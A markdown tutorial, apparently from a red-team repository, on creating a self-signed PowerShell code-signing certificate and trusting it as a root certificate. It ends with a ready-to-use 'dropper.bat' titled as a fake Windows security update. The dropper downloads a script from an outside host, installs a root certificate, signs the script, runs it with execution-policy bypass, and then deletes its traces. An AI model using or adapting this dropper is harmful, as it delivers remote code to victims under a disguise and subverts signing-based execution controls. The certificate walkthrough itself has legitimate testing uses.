### Create a Self-Signed Certificate for Code Signing

<br />

In PoweShell 3.0, the [New-SelfSifgnedCertificate](https://docs.microsoft.com/en-us/powershell/module/pkiclient/new-selfsignedcertificate?view=win10-ps) cmdlet was generating only SSL certificates that couldn’t be used to sign the driver and application code (unlike certificates generated by the MakeCert utility). In PowerShell 5 the new version of the New-SelfSifgnedCertificate
cmdlet can now be used to issue a Code Signing certificates.

<br />

#### Lets build our test script { my_posh_script.ps1 } - Open Notepad Copy/Paste/Save it
```
# Malicious Code to execute
write-host "Just to test IF certificate sign was worked.." -ForeGroundColor green -BackGroundColor black
Start-Sleep -Seconds 3

```
<br />

#### Lets set 'Target' PS Execution Policy to 'AllSigned' to test the script (no need admin rigths)
`Set-ExecutionPolicy AllSigned -Scope CurrentUser`
![drrr](https://user-images.githubusercontent.com/23490060/72698984-6cf18480-3b3e-11ea-8c93-81b5ae68a9d6.png)

<br />

#### Lets Run our Script (With PS ExecutionPolicy set to 'AllSigned')
[AllSigned = Requires that all scripts and files are signed by a trusted publisher, including scripts written on local computer.](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7)
![sd11](https://user-images.githubusercontent.com/23490060/72687408-6a1e7180-3af5-11ea-8d14-c0ffa221468d.png)

<br />


#### To create a self-signed certificate for signing the application code (my_posh_script.ps1), run the command:
```
$cert = New-SelfSignedCertificate -Subject "My Code Signing Certificate" -Type CodeSigningCert -CertStoreLocation cert:\LocalMachine\My
```
![sdr](https://user-images.githubusercontent.com/23490060/72689217-0dc44d80-3b07-11ea-98f6-1acadb0615b3.png)

<br />

#### Let’s try to sign our PowerShell script (my_posh_script.ps1) using this certificate:
```
Set-AuthenticodeSignature -FilePath $env:userprofile\Desktop\my_posh_script.ps1 -Certificate $cert
```
![fdr](https://user-images.githubusercontent.com/23490060/72689232-3cdabf00-3b07-11ea-9ba7-ff830fca7356.png)

**Remark:** f you are receiving an **'UnknownError'** warning when executing the command, this means that **'the certificate is not trusted'**.
Because it is located in the **'user’s personal certificates store'** To open the certificate store press: Windows+R -> `certlm.msc`.
![sd3](https://user-images.githubusercontent.com/23490060/72686272-bfa15100-3aea-11ea-9f1a-7ae2e2cb0cb2.png)

<br />

#### We need to move our certificate to the 'trusted root certificates' store
![sd4](https://user-images.githubusercontent.com/23490060/72686277-dba4f280-3aea-11ea-9332-9e8c274bb9fe.png)
![sd5](https://user-images.githubusercontent.com/23490060/72686281-e52e5a80-3aea-11ea-96a6-a11bf6e8e8f3.png)
![sd6](https://user-images.githubusercontent.com/23490060/72686284-ec556880-3aea-11ea-9af0-3e43c4ea8fa1.png)

<br />

#### After that, you can sign your PowerShell script with this self-signed certificate.
```
Set-AuthenticodeSignature -FilePath $env:userprofile\Desktop\my_posh_script.ps1 -Certificate $cert
```
![dsf](https://user-images.githubusercontent.com/23490060/72689414-1158d400-3b09-11ea-9d6a-449a224c1952.png)
#### After the script beeing signed, it will be append one certificate {code block} inside the PS script:
![po1](https://user-images.githubusercontent.com/23490060/72687557-d2ba1e00-3af6-11ea-840b-702ccbe4bc73.png)
#### Running the script with PS Execution-Policy set to 'AllSigned'
[AllSigned = Requires that all scripts and files are signed by a trusted publisher, including scripts written on local computer.](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7)
![sdff](https://user-images.githubusercontent.com/23490060/72687601-6a1f7100-3af7-11ea-8f95-9d611d8867b2.png)

---

<br />

**Remark:** After beeing signed, the PS script can not be changed under the risk of breaking cert code block

**Remark:** Remmenber that this certificate its only valid for the Local Machine (current PC) were it was been stored..
That means if we port the PS script to a remote machine it will not execute, because remote machine does not contain
this certificate in there certificate store ...

<br />

#### (cmd.exe) Revert Target System to 'Default' Settings. (admin privs requiered)
```
cd %tmp% && del /F /Q my_posh_script.ps1
cmd /c echo Y | powershell Set-ExecutionPolicy Restricted -Scope CurrentUser
powershell Get-ChildItem Cert:\LocalMachine\Root ^| Where-Object {$_.Issuer -match 'My_Code_Signing_Certificate'} ^| Remove-Item
```
---

<br />

This next step shows us how this technic can be abused (PS Execution Policy bypass) to remote Download/Execute our PS Script, even if target system is config to Only run digitally Signed PS scripts .. It will download, sign it and execute him ..

<br />

#### Batch (dropper.bat) Automation Example:
```
@echo off
color 03
title Cumulative Security Update KB4524147

echo [1] Set Target PS Execution Policy to 'AllSigned' to test script.
cmd /c echo Y | powershell Set-ExecutionPolicy AllSigned -Scope CurrentUser
timeout /T 2 >nul

echo [2] Downloading our PS script to target 'tmp' remote folder.
powershell -C (New-Object Net.WebClient).DownloadFile('http://192.168.1.71/my_posh_script.ps1', '$env:tmp\my_posh_script.ps1')
timeout /T 2 >nul

echo [3] Digitally sign Our Downloaded PS script (my_posh_script.ps1) { cert expires in six months }
powershell $cert = New-SelfSignedCertificate -Subject "My_Code_Signing_Certificate" -FriendlyName "SsaRedTeam" -NotAfter (Get-Date).AddMonths(6) -Type CodeSigningCert -CertStoreLocation cert:\LocalMachine\My;Move-Item -Path $cert.PSPath -Destination "Cert:\LocalMachine\Root";Set-AuthenticodeSignature -FilePath $env:tmp\my_posh_script.ps1 -Certificate $cert
timeout /T 2 >nul

echo [4] Executing our Downloaded script and bypass user intervention
cd %tmp% && cmd /c echo A | powershell -Execution Bypass -NoProfile -File my_posh_script.ps1
pause


echo [i] Reverting %userdomain% to Previous State (before dropper.bat exec)
timeout /T 3 >nul
cmd /c echo Y | powershell Set-ExecutionPolicy Restricted -Scope CurrentUser
echo [i] PowerShell Execution Policy Set to: 'Restricted' ..
cd %tmp% && del /F /Q my_posh_script.ps1
echo [i] my_posh_script.ps1 deleted from: %tmp% ..
timeout /T 2 >nul
echo [i] Deleting 'SsaRedTeam' (FriendlyName) Certificate from Cert Store ..
powershell Get-ChildItem Cert:\LocalMachine\Root ^| Where-Object {$_.Issuer -match 'My_Code_Signing_Certificate'}
powershell Get-ChildItem Cert:\LocalMachine\Root ^| Where-Object {$_.Issuer -match 'My_Code_Signing_Certificate'} ^| Remove-Item
pause
```

<br />

**Remark:** This batch script must be executed with **admin privileges**<br />
**Remark:** This Dropper.bat can **Download-PS-Script/Build-Cert/Sign-PS-Script/Execute-PS-Script** because the Policy
its set by Default to powershell Scripts Only (this policy does not affects batch scripts from running and executing all of this)..
![dff](https://user-images.githubusercontent.com/23490060/72754958-28f39380-3bc1-11ea-8eb8-d2c61351ba14.png)

<br />

### Final Notes:
- This Batch script in the end will revert target machine to previous state (before dropper.bat exec), by setting<br />
  the PS Execution Policy to **'Restricted'** (default), by deleting **'my_posh_script.ps1'** from **%tmp%** remote<br />
  folder and deletes the created certificate by **Issuer** (CN) Name { **CN=My_Code_Signing_Certificate** } ..

